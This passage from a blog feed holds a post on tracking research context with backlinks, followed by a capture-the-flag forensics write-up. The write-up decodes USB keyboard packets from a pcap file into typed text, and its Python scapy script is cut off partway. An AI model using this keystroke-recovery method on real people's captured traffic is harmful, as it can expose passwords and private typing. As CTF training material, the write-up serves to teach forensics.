        <summary type="html"><![CDATA[Reading is an integral part of writing.]]></summary>
        <content type="html"><![CDATA[<blockquote>
<p>Reading is an integral part of writing.</p>
</blockquote>
<p>There are many ways this statement can be phrased, but it carries the message accross. Before creating something new and original, we need to have information in the context of the thing we're trying to create.</p>
<p>And all of that starts with research.</p>
<blockquote>
<p>When I start researching a subject, I begin by googling something, which then turns into dozens of open tabs in the browser.</p>
</blockquote>
<blockquote>
<p>I'm too afraid to close any of the tabs, lest I forget something.</p>
</blockquote>
<blockquote>
<p>When I look at information I've stored, I no longer remember why I thought this was important, or how it connects to what I was searching for.</p>
</blockquote>
<p>Do these sound familiar to you? I can't imagine I'm the only one facing these problems.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="creating-a-linear-output-out-of-non-linear-input">Creating a linear output out of non-linear input<a href="https://kblagoev.com/blog/how-to-remember-what-i-was-reading-about#creating-a-linear-output-out-of-non-linear-input" class="hash-link" aria-label="Direct link to Creating a linear output out of non-linear input" title="Direct link to Creating a linear output out of non-linear input">​</a></h2>
<figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://kblagoev.com/content/images/2022/11/Notes_221101_230951_e4f.jpg" class="kg-image" loading="lazy" width="1620" height="1200" srcset="https://kblagoev.com/content/images/size/w600/2022/11/Notes_221101_230951_e4f.jpg 600w, https://kblagoev.com/content/images/size/w1000/2022/11/Notes_221101_230951_e4f.jpg 1000w, https://kblagoev.com/content/images/size/w1600/2022/11/Notes_221101_230951_e4f.jpg 1600w, https://kblagoev.com/content/images/2022/11/Notes_221101_230951_e4f.jpg 1620w" sizes="(min-width: 720px) 720px"><figcaption>Knowledge management lifecycle. This particular version separates between exploration and collection, which I find useful.</figcaption></figure>
<p>The thing that allowed me to think about the importance of contextualising knowledge, is the discovery of the knowledge management lifecycle. I've since seen many different versions of this thing, but the one that resonated with me was the following:</p>
<p>exploration -&gt; collection -&gt; contemplation -&gt; creation -&gt; sharing.</p>
<p>The reason this particular scheme spoke to me, was the distinction between  <em>exploration</em> and <em>collection</em>. In a typical for me scenario, when I set out to learn about something, I start by searching on Google, trying to get into a rabbit hole of knowledge gathering. This is the exploration phase of the above. But try and imagine how you jump from exploration to the thinking phase - contemplation.</p>
<p>After a successful search hunt, you now have let's say 20 tabs open in your browser. Some of them barely touch on the subject matter of interest, some of them have golden nuggets in there, and some you thought you'd read into later. Then a day passes, with the browser open, and you already don't remember what you wanted to read or take note of. And your "collection" is so ephemeral, that any closed tab could remove context from 10 other tabs. Imagine now that you have to stop thinking about this particular subject for a week, or longer...</p>
<p>In reality, we've touched upon the subject of non-linearity of the creation process. The process of creation is that of connecting preexisting information into a coherent, mostly linear output, with the occasional sidenote. But the information you're working with is itself messy: a complicated graph of intertwining lines connecting dots in your brain. It's multidimensional and non-linear.</p>
<p>And the exploration, collection, and even creation phase of the lifecycle are depicting exactly this phase of non-linearity of the process.</p>
<p>But moreover, your brain is not as good at remembering as a computer harddrive is.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="tracing-the-discovery-context">Tracing the discovery context<a href="https://kblagoev.com/blog/how-to-remember-what-i-was-reading-about#tracing-the-discovery-context" class="hash-link" aria-label="Direct link to Tracing the discovery context" title="Direct link to Tracing the discovery context">​</a></h2>
<p><em>"Well, obviously the solution to all of this is note-taking"</em>, I hear you say at the back of my head. And in a sense, you're right. But what would you write in those notes? Are your notes going to be any different from saving all of your open tabs in a folder in Notion? What happens when in a month you open up your Notion, and go to the folder consisting of 30 URLs. Do you still remember what was what in there? I definitely don't, but if you do, all the power to you.</p>
<p>This is where I started thinking of knowledge laid out in a graph in front of me, a map if you will. This is definitely not a unique idea, and some note-taking apps like Obsidian and RoamResearch already allow you to do this in certain ways. This is the idea of interconnecting different nuggets of information by linking between them - in a forwards and backwards direction.</p>
<p>And the backward direction is the crux of the problem. Opening 30 tabs in your browser, or saving 30 URLs in a text file, doesn't have one thing in particular - backlinks. Compiling a list of articles is not self-referential by design. It's a divergent thought process, or at best a linear read.</p>
<figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://kblagoev.com/content/images/2022/11/Notes_221101_232511_434-1.jpg" class="kg-image" loading="lazy" width="1728" height="1200" srcset="https://kblagoev.com/content/images/size/w600/2022/11/Notes_221101_232511_434-1.jpg 600w, https://kblagoev.com/content/images/size/w1000/2022/11/Notes_221101_232511_434-1.jpg 1000w, https://kblagoev.com/content/images/size/w1600/2022/11/Notes_221101_232511_434-1.jpg 1600w, https://kblagoev.com/content/images/2022/11/Notes_221101_232511_434-1.jpg 1728w" sizes="(min-width: 720px) 720px"><figcaption>Research is non-linear, and includes a lot of divergent paths. Finding how it all relates to the core subject is at the heart of creation. Tracing and storing the context of explored information is a solution to remembering relevant information when it's needed.</figcaption></figure>
<p>Let me give you a thought experiment. Have you even been on Wikipedia? A typical exploration phase on Wikipedia goes as follows - you search for an article on it, and start reading it. In the text you find something you need to know more about, so you click on the little blue text to learn more. On the new article, you do the same. And after a while, you're deep in a rabbit hole, gasping for air, your head pounding from the sounds of collapsing walls of dirt around you. And you don't even remember where you started from. Not that it doesn't feel good to learn so many new things, but you've completely diverged from your original research goal.</p>
<p>But what if instead, on the 5th article you went down to, you found a link to the original article you opened Wikipedia for? That would be awesome! You have now completed your first contextual circle! The rabbit hole just circled you back to your original path. You have validated your research, learned quite a few new things, and have returned to where you left off, able to continue on your merry path to enlightenment.</p>
<p>Also, the probability of this happening while researching on Google is close to none.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://kblagoev.com/blog/how-to-remember-what-i-was-reading-about#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">​</a></h2>
<p>The lack of <strong>stored context</strong> in the exploration phase is what makes it impossible to remember the <em>relevant</em> information during the collection or creation phases. No context means no way to connect separate information nuggets to a given concept, idea or subject. The brain simply dismisses it as irrelevant, and slowly gets rid of the memory.</p>
<p>Sadly, your typical browser interface doesn't really allow for visualising these complex non-linear interactions in lines of thought. This problem of the world-wide Web is something I believe <a href="https://en.wikipedia.org/wiki/Douglas_Engelbart" target="_blank" rel="noopener noreferrer">Douglas Engelbart</a> was fully aware of, and was unhappy about. But sadly it's a fundamental issue. I would love to get deeper into it, and even look for a solution. But to my knowledge, the only realistic way to avoid this decontextualised thought pattern in online research is manually creating a knowledge map of your own research.</p>
<p>And the manual solution reads something like this:</p>
<ol>
<li>During the exporation phase, don't worry about going down rabbit holes, but keep track of the context in which you discover information. The browser history might be useless in this scenario, but storing links with short descriptions or with the relevant search terms might be a useful manual step.</li>
<li>In the collection phase, take notes by having in mind the graphical representation of your knowledge. Your research can lead you to the following lines of thought:</li>
</ol>
<ul>
<li>diverge from the core subject, and never come back</li>
<li>diverge and wrap around to the core line of thought</li>
<li>diverge and join in with another divergent line of thought (could still be useful in the context of serendepity)</li>
</ul>
<p>As far as tools are concerned, you can discover what works best for you, but I recommend a note-taking tool which can create graphs of your knowledge map. It's so much better, when you can create an overview of interconnecting nuggets of knowledge, and see the context from a bird's perspective.</p>
<p>Having different information nuggets stored in an app also allows for their reuse, facilitating <strong>contextual serendipity</strong>. A concept I would like to discuss further as well.</p>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Getting Started" term="Getting Started"/>
        <category label="Knowledge Management" term="Knowledge Management"/>
        <category label="Research" term="Research"/>
        <category label="Backlinks" term="Backlinks"/>
        <category label="Search Engines" term="Search Engines"/>
        <category label="Creativity" term="Creativity"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Key Mission - Cyberapocalypse 2021 CTF]]></title>
        <id>https://kblagoev.com/blog/key-mission-cyberapocalypse-2021-ctf</id>
        <link href="https://kblagoev.com/blog/key-mission-cyberapocalypse-2021-ctf"/>
        <updated>2021-04-30T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is a writeup for the Key Mission challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Forensics.]]></summary>
        <content type="html"><![CDATA[<p>This is a writeup for the Key Mission challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Forensics.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="prompt">Prompt<a href="https://kblagoev.com/blog/key-mission-cyberapocalypse-2021-ctf#prompt" class="hash-link" aria-label="Direct link to Prompt" title="Direct link to Prompt">​</a></h3>
<p>The secretary of earth defense has been kidnapped. We have sent our elite team on the enemy's base to find his location. Our team only managed to intercept this traffic. Your mission is to retrieve secretary's hidden location.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://kblagoev.com/blog/key-mission-cyberapocalypse-2021-ctf#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h3>
<p>We're supplied with a Wireshark <code>.pcap</code> file, which seems to be filled with packets coming from an USB interface.</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No.	Time	Source	Destination	Protocol	Length	Info</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1151	244.436586	3.2.1	host	USB	72	URB_INTERRUPT in</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1152	244.436609	host	3.2.1	USB	64	URB_INTERRUPT in</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We're particularly interested in the ones coming from Source <code>3.2.1</code>, since they hold additional data in the form of 8 more bytes at the end of the packet data:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">0000   c0 46 bd 04 55 8c ff ff 43 01 81 02 03 00 2d 00   ÀF½.U.ÿÿC.....-.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0010   72 22 7f 60 00 00 00 00 d7 4c 0b 00 00 00 00 00   r".`....×L......</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0020   08 00 00 00 08 00 00 00 00 00 00 00 00 00 00 00   ................</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0030   01 00 00 00 00 00 00 00 04 02 00 00 00 00 00 00   ................</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0040   02 00 2d 00 00 00 00 00                           ..-.....</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>In particular, we will be interested in the bytes which are 8th and 6th counting from the end, in this case <code>02</code> and <code>2d</code> respectively.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="analysis">Analysis<a href="https://kblagoev.com/blog/key-mission-cyberapocalypse-2021-ctf#analysis" class="hash-link" aria-label="Direct link to Analysis" title="Direct link to Analysis">​</a></h3>
<p>From the name of the challenge, we can assume that we will be analysing a keyboard being used for typing. If we scroll around the packets in Wireshark, we will notice that the one byte which always changes is the 6th one from the end.</p>
<p>If we look up keyboard mappings, we will find <a href="https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf" target="_blank" rel="noopener noreferrer">this cool documentation</a> online for Usage tables of Human interface devices, which holds information on which byte codes mean what. For example, we can find that our <code>2d</code> byte from above means the symbol <code>-</code> (hyphen) or underscore <code>_</code>.</p>
<p>This is where we come at a difficulty, because even though we have information that the shift key is supposedly sent as byte <code>E1</code>, this is not how it's used in our pcap file.</p>
<p>Initially I ignored this, and got a flag which didn't get accepted. It brought me to some frustration, but I kept digging until I found <a href="https://github.com/TeamRocketIst/ctf-usb-keyboard-parser" target="_blank" rel="noopener noreferrer">this repo</a> on GitHub, in which the creator handled the <em>shift</em> key in another way.</p>
<p>Namely, he took the <code>0x40</code>-th byte (or 8th counting from the end) from the packet data, and if it was a <code>02</code> or a <code>20</code>, that would mean that the (left or right) shift key is pressed.</p>
<p>At this point, we can just use that script, and get our flag, but I wanted to do it with my own script, which was 95% working at this point.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a href="https://kblagoev.com/blog/key-mission-cyberapocalypse-2021-ctf#solution" class="hash-link" aria-label="Direct link to Solution" title="Direct link to Solution">​</a></h3>
<p>Applying everything we learned, we can go ahead and</p>
<ol>
<li>Take the mappings from the pdf documentation, and create a dictionary of hex -&gt; key value pairs.</li>
<li>Write a script which loads the <code>pcap</code> file, using <code>scapy</code> for example.</li>
<li>Read the 6th and 8th bytes counting from the end of each packet data.</li>
<li>Use the 8th byte to detect <code>Shift</code> presses.</li>
<li>Use the 6th byte to determine the symbol being typed.</li>
<li>String it all together (we can also handle backspace by removing the last element from our string).</li>
</ol>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> scapy</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> sys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mapping_shift </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x02</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'&lt;Shift&gt;'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'&lt;RShift&gt;'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mapping </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">""</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">""</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"ErrorRollOver"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"ErrorRollOver"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x02</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"POSTFail9"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"POSTFail9"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x03</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"ErrorUndefined"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"ErrorUndefined"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x04</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"a"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"A"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"b"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"B"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x06</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"c"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"C"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x07</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"d"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"D"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x08</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"e"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"E"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x09</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"f"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"F"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x0A</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"g"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"G"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x0B</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"h"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"H"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x0C</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"i"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"I"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x0D</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"j"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"J"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x0E</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"k"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"K"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x0F</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"l"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"L"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"m"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"M"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x11</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"n"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"N"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x12</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"o"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"O"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x13</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"p"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"P"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x14</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"q"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Q"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x15</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"r"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"R"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x16</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"s"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"S"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x17</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"t"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"T"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"u"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"U"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x19</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"v"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"V"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x1A</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" 